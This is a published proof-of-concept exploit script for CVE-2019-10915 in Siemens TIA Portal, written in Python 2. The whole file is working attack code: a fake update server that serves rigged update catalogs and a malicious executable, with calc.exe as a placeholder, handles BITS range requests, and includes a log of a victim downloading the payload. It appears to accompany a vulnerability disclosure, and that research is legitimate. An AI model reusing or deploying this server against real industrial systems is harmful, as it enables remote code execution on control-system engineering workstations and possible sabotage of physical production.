##
# Exploit Title: Siemens TIA Portal remote command execution
# Date: 06/11/2019
# Exploit Author: Joseph Bingham
# CVE : CVE-2019-10915
# Advisory: https://www.tenable.com/security/research/tra-2019-33
# Writeup: https://medium.com/tenable-techblog/nuclear-meltdown-with-critical-ics-vulnerabilities-8af3a1a13e6a
# Affected Vendors/Device/Firmware:
#  - Siemens STEP7 / TIA Portal
##

##
# Example usage
# $python cve_2019_10915_tia_update_server.py
# Starting httpd...
#  10.0.0.134 - - [07/Jul/2019 22:00:25] "GET /FakeUpdate/ HTTP/1.1" 200 -
#  10.0.0.134 - - [07/Jul/2019 22:00:27] "GET /FakeUpdate/ProductionLine1 HTTP/1.1" 200 -
#  10.0.0.134 - - [07/Jul/2019 22:00:33] "GET /FakeUpdate/ProductionLine1/SWM_RollOut_Configuration.xml HTTP/1.1" 200 -
#  10.0.0.134 - - [07/Jul/2019 22:00:37] "GET /FakeUpdate/ProductionLine1/UpdatesSummaryCatalog.xml HTTP/1.1" 200 -
#  10.0.0.134 - - [07/Jul/2019 22:00:41] "GET /FakeUpdate/simatic/tiaportal/SEBU-TIAPORTALUPDATE/15.1.0.4//Inventory_TIAPORTAL_V15_UPD99.xml HTTP/1.1" 200 -
#  10.0.0.134 - - [07/Jul/2019 22:00:49] "HEAD /FakeUpdate/simatic/tiaportal/SEBU-TIAPORTALUPDATE/15.1.0.4/Inventory_TIAPORTAL_V15_UPD99.exe HTTP/1.1" 200 -
#  10.0.0.134 - - [07/Jul/2019 22:00:50] "HEAD /FakeUpdate/simatic/tiaportal/SEBU-TIAPORTALUPDATE/15.1.0.4/Inventory_TIAPORTAL_V15_UPD99.txt HTTP/1.1" 200 -
#  10.0.0.134 - - [07/Jul/2019 22:00:57] "GET /FakeUpdate/simatic/tiaportal/SEBU-TIAPORTALUPDATE/15.1.0.4/Inventory_TIAPORTAL_V15_UPD99.exe HTTP/1.1" 200 -
##


from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
import SocketServer
import json, time, os

rollout_config          = "SWM_RollOut_Configuration.xml"
updates_summary_catalog = "UpdatesSummaryCatalog.xml"

mal_update_url = "Inventory_TIAPORTAL_V15_UPD99.xml"
mal_binary_url = "Inventory_TIAPORTAL_V15_UPD99.exe"
mal_text_url   = "Inventory_TIAPORTAL_V15_UPD99.txt"

mal_updates_xml_file = "mal_UpdatesSummaryCatalog.xml"
mal_update_xml_file  = "mal_Inventory_TIAPORTAL_V15_UPD99.xml"
mal_text_file        = "mal_Inventory_TIAPORTAL_V15_UPD99.txt"
mal_binary_file      = "calc.exe"

class S(BaseHTTPRequestHandler):
    def _get_binary(self, url, data_start=0, data_len=-1):
        fn = mal_binary_file
        f = open(fn, "rb")
        print '[+] Reading %s, sending segment [seeking->%d, reading->%d]' % (fn, data_start, data_len)
        f.seek(data_start)
        b = f.read(data_len)
        f.close()
        return b

    def _get_BITS_range(self):
        match_str = "bytes="
        if (self.headers.has_key('Range')):
            header_range = self.headers['Range']
            if (header_range.find(match_str) != -1):
                bytes_range = header_range[header_range.find(match_str)+len(match_str):]
                ba = [int(i) for i in bytes_range.split('-')]
                print "  Got BITS range %d-%d" % (ba[0], ba[1])
                return [ba[0], ba[1]]
            return False
        return False

    def _get_text(self, url, req_type = "GET"):
        fn = mal_text_file
        f = open(fn, "r")
        b = f.read(-1)
        f.close()
        return b

    def _get_xml(self, url, req_type = "GET"):
        if url.find(rollout_config) != -1:
            xml_data = ""
        elif url.find(updates_summary_catalog) != -1:
            print '[+] Writing xml update forwarder -> %s' % mal_update_url
            f = open(mal_updates_xml_file, "r")
            xml_data = f.read(-1)
            f.close()
        elif url.find(mal_update_url) != -1:
            print '[+] Writing binary update forwarder -> %s' % mal_binary_url
            f = open(mal_update_xml_file, "r")
            xml_data = f.read(-1)
            f.close()
        else:
            xml_data = "NOT FOUND"
        return xml_data

    def _set_headers(self, data_type = "text", BITS_range_start=-1, BITS_range_end=-1):
        if (data_type == "exe"):
            if (self.path.find(mal_binary_url) != -1):
                fn = mal_binary_file
            elif (self.path.find(mal_text_url) != -1):
                fn = mal_text_file
            else:
                fn = mal_text_file
            binary_len = os.path.getsize(fn)

            self.send_response(200)
            self.send_header('Content-type', 'application/octet-stream')
            print '  Using headers %d->%d' % (BITS_range_start, BITS_range_end)
            if (BITS_range_start > -1 and BITS_range_end > -1):
                binary_len = BITS_range_end - BITS_range_start
                self.send_header('Range', 'bytes=%d-%d' % (BITS_range_start, BITS_range_end))
            self.send_header('Content-Length', '%d' % binary_len)
            self.end_headers()
        else:
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

    def do_GET(self):
        time.sleep(1)
        if (self.path.find(".xml") != -1):
            data = self._get_xml(self.path)
            self._set_headers()
        elif (self.path.find(".exe") != -1):
            # Check BITS Range header
            print '  Checking BITS Range'
            byte_range = self._get_BITS_range()
            if (byte_range):
                data = self._get_binary(self.path, byte_range[0], byte_range[1]-byte_range[0])
                self._set_headers("exe", byte_range[0], byte_range[1])
            else:
                data = self._get_binary(self.path)
                self._set_headers("exe")
        elif (self.path.find(".txt") != -1):
            data = self._get_text(self.path)
            self._set_headers()
        else:
            data = "OK"
            self._set_headers()
        self.wfile.write(data)
        print " [GET: %s]  Sending back [%d]" % (self.path, len(data))

    def do_HEAD(self):
        if (self.path.find(mal_binary_url) != -1):
            fn = mal_binary_file
        elif (self.path.find(mal_text_url) != -1):
            fn = mal_text_file
        else:
            fn = mal_text_file

        binary_len = os.path.getsize(fn)

        self.send_response(200)
        self.send_header('ETag', '3bb202100a08db8e9a8019200b1bc6a8:1541514462')
        self.send_header('Last-Modified', 'Thursday, 4 July 2019 18:57:50 GMT')
        self.send_header('Accept-Ranges', 'bytes')
        self.send_header('Content-Length', '%d' % binary_len)
        #self.send_header('Connection', 'keep-alive')
        self.send_header('Content-type', 'application/octet-stream')
        self.end_headers()

def run(server_class=HTTPServer, handler_class=S, port=80):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print ' Starting malicious firmware update server...'
    httpd.serve_forever()    

run()
